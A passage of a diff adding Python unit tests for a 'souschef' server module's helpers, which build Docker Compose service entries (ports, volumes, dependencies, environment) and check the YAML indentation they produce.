+
+        service = _build_compose_service(plan, "postgres")
+
+        # Verify volume is created
+        assert "volumes" in service
+        assert "postgres_data:/var/lib/app" in service["volumes"]
+
+    def test_build_compose_service_with_dependencies(self):
+        """Test _build_compose_service with service dependencies."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "backend", "version": "2.0.0"},
+            "ports": [{"name": "port", "value": "app.port"}],
+            "binds": [
+                {"name": "postgresql", "value": "database"},
+                {"name": "redis", "value": "cache"},
+            ],
+            "callbacks": {},
+        }
+
+        service = _build_compose_service(plan, "backend")
+
+        # Verify dependencies are configured
+        assert "depends_on" in service
+        assert "postgresql" in service["depends_on"]
+        assert "redis" in service["depends_on"]
+        assert len(service["depends_on"]) == 2
+
+    def test_build_compose_service_complete(self):
+        """Test _build_compose_service with all features."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "myapp", "version": "3.1.4"},
+            "ports": [
+                {"name": "http", "value": "server.port"},
+                {"name": "admin", "value": "admin.port"},
+            ],
+            "binds": [{"name": "database", "value": "db"}],
+            "callbacks": {"do_init": "mkdir -p /var/lib/app/data"},
+        }
+
+        service = _build_compose_service(plan, "myapp")
+
+        # Verify all components are present
+        assert service["container_name"] == "myapp"
+        assert service["build"]["dockerfile"] == "Dockerfile.myapp"
+        assert "ports" in service
+        assert "80:80" in service["ports"]
+        assert "volumes" in service
+        assert "myapp_data:/var/lib/app" in service["volumes"]
+        assert "depends_on" in service
+        assert "database" in service["depends_on"]
+        assert "HTTP=80" in service["environment"]
+
+    def test_build_compose_service_custom_port(self):
+        """Test _build_compose_service with custom port mapping."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "custom", "version": "1.0.0"},
+            "ports": [{"name": "port", "value": "custom.port"}],
+            "binds": [],
+            "callbacks": {},
+        }
+
+        service = _build_compose_service(plan, "custom")
+
+        # Default port should be 8080
+        assert "ports" in service
+        assert "8080:8080" in service["ports"]
+        assert "PORT=8080" in service["environment"]
+
+    def test_build_compose_service_no_volumes_without_init(self):
+        """Test _build_compose_service doesn't add volumes without data needs."""
+        from souschef.server import _build_compose_service
+
+        plan = {
+            "package": {"name": "stateless", "version": "1.0.0"},
+            "ports": [{"name": "http", "value": "app.port"}],
+            "binds": [],
+            "callbacks": {"do_build": "make"},  # No do_init with mkdir
+        }
+
+        service = _build_compose_service(plan, "stateless")
+
+        # Should not have volumes
+        assert "volumes" not in service
+
+    def test_add_service_build_with_context(self):
+        """Test _add_service_build with build configuration."""
+        from souschef.server import _add_service_build
+
+        lines = []
+        service = {"build": {"context": ".", "dockerfile": "Dockerfile.myapp"}}
+
+        _add_service_build(lines, service)
+
+        assert "    build:" in lines
+        assert "      context: ." in lines
+        assert "      dockerfile: Dockerfile.myapp" in lines
+        assert len(lines) == 3
+
+    def test_add_service_build_without_config(self):
+        """Test _add_service_build without build configuration."""
+        from souschef.server import _add_service_build
+
+        lines = []
+        service = {}
+
+        _add_service_build(lines, service)
+
+        # Should not add anything
+        assert len(lines) == 0
+
+    def test_add_service_ports_single(self):
+        """Test _add_service_ports with single port."""
+        from souschef.server import _add_service_ports
+
+        lines = []
+        service = {"ports": ["80:80"]}
+
+        _add_service_ports(lines, service)
+
+        assert "    ports:" in lines
+        assert '      - "80:80"' in lines
+        assert len(lines) == 2
+
+    def test_add_service_ports_multiple(self):
+        """Test _add_service_ports with multiple ports."""
+        from souschef.server import _add_service_ports
+
+        lines = []
+        service = {"ports": ["80:80", "443:443", "8080:8080"]}
+
+        _add_service_ports(lines, service)
+
+        assert "    ports:" in lines
+        assert '      - "80:80"' in lines
+        assert '      - "443:443"' in lines
+        assert '      - "8080:8080"' in lines
+        assert len(lines) == 4
+
+    def test_add_service_ports_empty_list(self):
+        """Test _add_service_ports with empty port list."""
+        from souschef.server import _add_service_ports
+
+        lines = []
+        service = {"ports": []}
+
+        _add_service_ports(lines, service)
+
+        # Should add header but no ports
+        assert "    ports:" in lines
+        assert len(lines) == 1
+
+    def test_add_service_ports_without_config(self):
+        """Test _add_service_ports without ports configuration."""
+        from souschef.server import _add_service_ports
+
+        lines = []
+        service = {}
+
+        _add_service_ports(lines, service)
+
+        # Should not add anything
+        assert len(lines) == 0
+
+    def test_add_service_volumes_with_tracking(self):
+        """Test _add_service_volumes tracks volume names."""
+        from souschef.server import _add_service_volumes
+
+        lines = []
+        volumes_used = set()
+        service = {
+            "volumes": ["postgres_data:/var/lib/postgresql", "config_data:/etc/config"]
+        }
+
+        _add_service_volumes(lines, service, volumes_used)
+
+        assert "    volumes:" in lines
+        assert "      - postgres_data:/var/lib/postgresql" in lines
+        assert "      - config_data:/etc/config" in lines
+        # Check volume names are tracked
+        assert "postgres_data" in volumes_used
+        assert "config_data" in volumes_used
+        assert len(volumes_used) == 2
+
+    def test_add_service_volumes_without_config(self):
+        """Test _add_service_volumes without volumes configuration."""
+        from souschef.server import _add_service_volumes
+
+        lines = []
+        volumes_used = set()
+        service = {}
+
+        _add_service_volumes(lines, service, volumes_used)
+
+        # Should not add anything
+        assert len(lines) == 0
+        assert len(volumes_used) == 0
+
+    def test_add_service_environment_single(self):
+        """Test _add_service_environment with single variable."""
+        from souschef.server import _add_service_environment
+
+        lines = []
+        service = {"environment": ["NODE_ENV=production"]}
+
+        _add_service_environment(lines, service)
+
+        assert "    environment:" in lines
+        assert "      - NODE_ENV=production" in lines
+        assert len(lines) == 2
+
+    def test_add_service_environment_multiple(self):
+        """Test _add_service_environment with multiple variables."""
+        from souschef.server import _add_service_environment
+
+        lines = []
+        service = {
+            "environment": [
+                "NODE_ENV=production",
+                "PORT=8080",
+                "DATABASE_URL=postgres://localhost/db",
+            ]
+        }
+
+        _add_service_environment(lines, service)
+
+        assert "    environment:" in lines
+        assert "      - NODE_ENV=production" in lines
+        assert "      - PORT=8080" in lines
+        assert "      - DATABASE_URL=postgres://localhost/db" in lines
+        assert len(lines) == 4
+
+    def test_add_service_environment_without_config(self):
+        """Test _add_service_environment without environment configuration."""
+        from souschef.server import _add_service_environment
+
+        lines = []
+        service = {}
+
+        _add_service_environment(lines, service)
+
+        # Should not add anything
+        assert len(lines) == 0
+
+    def test_add_service_dependencies_with_both(self):
+        """Test _add_service_dependencies with both depends_on and networks."""
+        from souschef.server import _add_service_dependencies
+
+        lines = []
+        service = {
+            "depends_on": ["database", "redis"],
+            "networks": ["backend", "frontend"],
+        }
+
+        _add_service_dependencies(lines, service)
+
+        assert "    depends_on:" in lines
+        assert "      - database" in lines
+        assert "      - redis" in lines
+        assert "    networks:" in lines
+        assert "      - backend" in lines
+        assert "      - frontend" in lines
+        assert len(lines) == 6
+
+    def test_add_service_dependencies_only_depends_on(self):
+        """Test _add_service_dependencies with only depends_on."""
+        from souschef.server import _add_service_dependencies
+
+        lines = []
+        service = {"depends_on": ["postgres", "cache"]}
+
+        _add_service_dependencies(lines, service)
+
+        assert "    depends_on:" in lines
+        assert "      - postgres" in lines
+        assert "      - cache" in lines
+        assert "    networks:" not in lines
+        assert len(lines) == 3
+
+    def test_add_service_dependencies_only_networks(self):
+        """Test _add_service_dependencies with only networks."""
+        from souschef.server import _add_service_dependencies
+
+        lines = []
+        service = {"networks": ["app_network"]}
+
+        _add_service_dependencies(lines, service)
+
+        assert "    depends_on:" not in lines
+        assert "    networks:" in lines
+        assert "      - app_network" in lines
+        assert len(lines) == 2
+
+    def test_add_service_dependencies_without_config(self):
+        """Test _add_service_dependencies without any configuration."""
+        from souschef.server import _add_service_dependencies
+
+        lines = []
+        service = {}
+
+        _add_service_dependencies(lines, service)
+
+        # Should not add anything
+        assert len(lines) == 0
+
+    def test_yaml_formatting_indentation(self):
+        """Test all YAML helpers use consistent indentation."""
+        from souschef.server import (
+            _add_service_build,
+            _add_service_dependencies,
+            _add_service_environment,
+            _add_service_ports,
+            _add_service_volumes,
+        )
+
+        # Test that all top-level items use 4 spaces
+        # and sub-items use 6 spaces
+
+        lines = []
+        service = {
+            "build": {"context": ".", "dockerfile": "Dockerfile.test"},
+            "ports": ["80:80"],
+            "volumes": ["data:/var/lib/data"],
+            "environment": ["ENV=test"],
+            "depends_on": ["db"],
+            "networks": ["net"],
+        }
+        volumes_used = set()
+
+        _add_service_build(lines, service)
+        _add_service_ports(lines, service)
+        _add_service_volumes(lines, service, volumes_used)
+        _add_service_environment(lines, service)
+        _add_service_dependencies(lines, service)
+
+        # Verify consistent indentation
+        for line in lines:
+            if not line.strip():  # Skip empty lines
+                continue
+            stripped = line.strip()
+            if line.endswith(":") and not stripped.startswith("-"):
+                # Section headers should have 4 spaces
+                assert line.startswith("    ")
+            elif stripped.startswith("-"):
+                # List items should have 6 spaces
+                assert line.startswith("      ")
+            elif ":" in line and not line.endswith(":"):
+                # Key-value pairs (but not section headers) should have proper indentation
+                # (either 4 or 6 spaces depending on context)
+                assert line.startswith("    ") or line.startswith("      ")
